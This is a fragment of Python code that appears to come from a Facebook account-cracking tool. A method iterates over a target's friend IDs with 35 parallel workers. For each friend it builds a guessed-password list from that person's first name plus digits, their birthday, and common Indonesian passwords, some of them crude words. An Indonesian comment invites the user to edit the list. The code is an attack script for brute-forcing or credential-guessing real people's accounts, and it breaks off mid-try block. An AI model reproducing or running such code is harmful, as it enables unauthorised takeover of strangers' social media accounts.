	...
	def sendTeman(self):
		...
		with Bool(max_workers=35) as tokai:
			...
			for id in idTeman:
				...
				try:pwList=[r2['first_name'],r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','Sayang','Bangsad','123456','102030','786786','Anjing','Kontol','Bismillah','Indonesia',r2['birthday']] #Password list ubah lah jika itu butuh :)
				except:pass
				try:
